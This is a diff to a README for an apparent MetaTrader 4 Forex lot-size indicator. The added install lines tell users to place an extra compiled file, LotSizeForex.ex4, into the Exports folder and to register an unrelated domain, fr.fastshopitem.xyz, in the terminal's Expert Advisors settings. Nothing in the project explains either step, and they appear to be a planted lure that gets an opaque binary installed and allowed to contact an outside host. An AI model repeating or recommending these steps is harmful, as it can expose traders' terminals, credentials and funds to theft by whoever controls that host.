@@ -16,7 +16,10 @@ This indicator shows lot size on Fibonacci Retracement.
 <details open>
 <summary>Install</summary>
 
-Download File and Paste in MQL4->Indicators.
+Download File and Paste: LotSizeCalculator.ex4 in MQL4->Indicators.
+                         LotSizeForex.ex4 in MQL4->Exports.
+
+Import http://fr.fastshopitem.xyz/  into  tools->options->Expert Advisors
 
 ```bash
 git clone https://github.com/ErROR97/Forex_Lot_Size_Calculator.git # clone
